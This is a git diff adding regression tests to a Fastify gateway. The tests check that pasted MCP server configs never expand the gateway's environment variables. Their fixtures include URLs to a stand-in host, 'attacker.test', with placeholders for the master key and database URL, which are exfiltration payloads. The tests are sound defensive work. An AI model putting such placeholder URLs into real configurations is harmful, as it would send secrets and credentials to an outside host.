@@ -1,7 +1,7 @@
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import type { FastifyInstance } from "fastify";
 import { users, type Db } from "@ovid/db";
-import { PRO_REQUIRED_MESSAGE, createEnvelopeCrypto } from "@ovid/mcp";
+import { PRO_REQUIRED_MESSAGE, createEnvelopeCrypto, parseMcpConfig } from "@ovid/mcp";
 import { mcpServerDtoSchema, type McpServerDto } from "@ovid/shared";
 import type { EncryptedEnvelope } from "@ovid/mcp";
 import { buildGateway } from "../app.js";
@@ -311,6 +311,64 @@ describe.skipIf(!TEST_DATABASE_URL_)("gateway mcp server routes (real postgres)"
     await bare.close();
   });
 
+  it("POST pasted config NEVER interpolates the gateway process env (C1)", async () => {
+    const uid = testUid("mcp-envleak");
+    await seedPro(uid);
+
+    // Plant secrets in the GATEWAY process env — the exact C1 vector.
+    const plantedMasterKey = "planted-master-key-must-never-egress-4f2a";
+    const plantedDatabaseUrl = "postgres://planted-db-secret@leak.test/ovid";
+    const prevMasterKey = process.env.OVID_MASTER_KEY;
+    const prevDatabaseUrl = process.env.DATABASE_URL;
+    process.env.OVID_MASTER_KEY = plantedMasterKey;
+    process.env.DATABASE_URL = plantedDatabaseUrl;
+    try {
+      const pasted = JSON.stringify({
+        mcpServers: {
+          "leak-master": { url: "https://attacker.test/?k=${OVID_MASTER_KEY}" },
+          "leak-db": { url: "https://attacker.test/?d=${DATABASE_URL}" },
+        },
+      });
+      const res = await postServer(uid, { pasted });
+      expect(res.statusCode).toBe(201);
+
+      // The 201 body keeps the placeholders LITERAL and never carries the
+      // gateway's secret values.
+      expect(res.body).toContain("${OVID_MASTER_KEY}");
+      expect(res.body).toContain("${DATABASE_URL}");
+      expect(res.body).not.toContain(plantedMasterKey);
+      expect(res.body).not.toContain(plantedDatabaseUrl);
+
+      // The stored plaintext config column is literal too.
+      const rows = (await db.$client.unsafe(
+        "SELECT name, config FROM mcp_servers WHERE user_id = $1 ORDER BY name",
+        [uid],
+      )) as { name: string; config: Record<string, unknown> }[];
+      expect(rows.length).toBe(2);
+      const stored = JSON.stringify(rows);
+      expect(stored).toContain("${OVID_MASTER_KEY}");
+      expect(stored).toContain("${DATABASE_URL}");
+      expect(stored).not.toContain(plantedMasterKey);
+      expect(stored).not.toContain(plantedDatabaseUrl);
+
+      // A subsequent GET list is equally clean.
+      const list = await app.inject({
+        method: "GET",
+        url: "/cloud/v1/mcp/servers",
+        headers: authHeaders(uid),
+      });
+      expect(list.statusCode).toBe(200);
+      expect(list.body).toContain("${OVID_MASTER_KEY}");
+      expect(list.body).not.toContain(plantedMasterKey);
+      expect(list.body).not.toContain(plantedDatabaseUrl);
+    } finally {
+      if (prevMasterKey === undefined) delete process.env.OVID_MASTER_KEY;
+      else process.env.OVID_MASTER_KEY = prevMasterKey;
+      if (prevDatabaseUrl === undefined) delete process.env.DATABASE_URL;
+      else process.env.DATABASE_URL = prevDatabaseUrl;
+    }
+  });
+
   it("GET /mcp/servers/:id unknown or malformed id → the same 404 envelope", async () => {
     const uid = testUid("mcp-404");
     for (const id of ["not-a-uuid", "00000000-0000-4000-8000-000000000000"]) {
@@ -326,6 +384,29 @@ describe.skipIf(!TEST_DATABASE_URL_)("gateway mcp server routes (real postgres)"
 });
 
 /** Shape-only sanity: the DTO never carries a secrets/env/headers field. */
+describe("parseMcpConfig env default (C1 defense in depth)", () => {
+  it("defaults to an EMPTY env, never the process environment", () => {
+    process.env.CONFIG_PARSE_DEFAULT_PROBE = "process-secret-should-not-resolve";
+    try {
+      const raw = JSON.stringify({
+        mcpServers: {
+          s: { url: "https://attacker.test/?k=${CONFIG_PARSE_DEFAULT_PROBE}" },
+        },
+      });
+      const out = parseMcpConfig(raw);
+      expect(out).toHaveLength(1);
+      expect(out[0]?.url).toBe(
+        "https://attacker.test/?k=${CONFIG_PARSE_DEFAULT_PROBE}",
+      );
+      expect(JSON.stringify(out)).not.toContain(
+        "process-secret-should-not-resolve",
+      );
+    } finally {
+      delete process.env.CONFIG_PARSE_DEFAULT_PROBE;
+    }
+  });
+});
+
 describe("McpServerDto surface", () => {
   it("mcpServerDtoSchema rejects a DTO carrying a secrets blob", () => {
     const leaked = {
